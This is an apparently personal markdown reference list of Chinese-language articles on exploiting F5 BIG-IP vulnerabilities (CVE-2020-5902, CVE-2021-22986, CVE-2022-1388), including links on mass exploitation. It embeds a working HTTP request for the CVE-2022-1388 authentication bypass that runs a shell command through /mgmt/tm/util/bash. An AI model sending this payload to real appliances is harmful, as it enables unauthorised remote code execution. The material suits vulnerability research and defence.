# F5 big

F5 Networks K52145254：TMUI RCE 漏洞 CVE-2020-5902
+ [HSQLDB反序列化](https://buaq.net/go-84779.html)


F5 BIGIP iControl REST CVE-2021-22986
+ [脚本小子是如何复现漏洞(CVE-2021-22986)并实现批量利用](https://mp.weixin.qq.com/s/cavKq04hNU5pJoTBiPMZkw)
+ [F5 BIGIP iControl REST CVE-2021-22986漏洞分析与利用](https://www.anquanke.com/post/id/236159)
+ [F5 BIG-IP Cookie 信息泄露利用工具](https://mp.weixin.qq.com/s/RzYSA1ADrIQYQxqjug62sg)
+ [漏洞复现-F5 BIG-IP远程代码执行漏洞(CVE-2021-22986)](https://mp.weixin.qq.com/s/CDST3_FcVM8tvB0hTlrsJg)

CVE-2022-1388
+ [BIG-IP(CVE-2022-1388)从修复方案分析出exp](https://mp.weixin.qq.com/s/6gVZVRSDRmeGcNYjTldw1Q)
```
POST /mgmt/tm/util/bash HTTP/1.1
Host: 
Connection: keep-alive, X-F5-Auth-Token
Authorization: Basic YWRtaW46QVNhc1M=
Content-Length: 45

{
"command":"run",
"utilCmdArgs":"-c id"
}
```
+ [CVE-2022-1388 F5 BIG-IP iControl REST 处理进程分析与认证绕过漏洞复现](https://mp.weixin.qq.com/s/DR0RGE0lhBjBIF3TbDLhMw)
+ [CVE-2022-1388：扩展攻击之文件写入](https://mp.weixin.qq.com/s?__biz=MzkwMzM2NDE5OQ==&mid=2247483731&idx=1&sn=6ac2832719258adbbcf718984558d2cb&chksm=c0962a5bf7e1a34daeb3cfbd92b3de27718aa372374b022e5d7f0ab0923e585012d7be7c429d&scene=132#wechat_redirect) **写入的地址/usr/local/www/**
